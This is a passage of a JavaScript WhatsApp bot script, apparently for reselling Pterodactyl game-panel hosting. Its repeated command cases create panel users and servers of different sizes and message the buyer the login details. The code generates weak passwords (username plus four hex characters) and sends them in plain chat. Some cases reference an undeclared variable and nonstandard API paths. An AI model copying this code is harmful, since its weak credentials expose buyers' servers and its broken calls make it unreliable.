let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "6024"
let cpu = "170"
let disk = "6024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domainV2}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c7gb": {
       
    if (!isReseller && !isCreator) return m.reply(mess.prem)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "7024"
let cpu = "180"
let disk = "7024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domain}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c7gb-v2": {
if (!isPremium && !isCreator) return m.reply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "7024"
let cpu = "180"
let disk = "7024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domainV2}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c8gb": {
       
    if (!isReseller && !isCreator) return m.reply(mess.prem)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "8024"
let cpu = "190"
let disk = "8024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domain}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c8gb-v2": {
if (!isPremium && !isCreator) return m.reply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "8024"
let cpu = "190"
let disk = "8024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domainV2}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c9gb": {
       
    if (!isReseller && !isCreator) return m.reply(mess.prem)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "9024"
let cpu = "200"
let disk = "9024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domain}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,

"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c9gb-v2": {
if (!isPremium && !isCreator) return m.reply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "9024"
let cpu = "200"
let disk = "9024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domainV2}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c10gb": {
       
    if (!isReseller && !isCreator) return m.reply(mess.prem)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "10024"
let cpu = "210"
let disk = "10024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domain}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c10gb-v2": {
if (!isPremium && !isCreator) return m.reply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "10024"
let cpu = "210"
let disk = "5024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domainV2}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
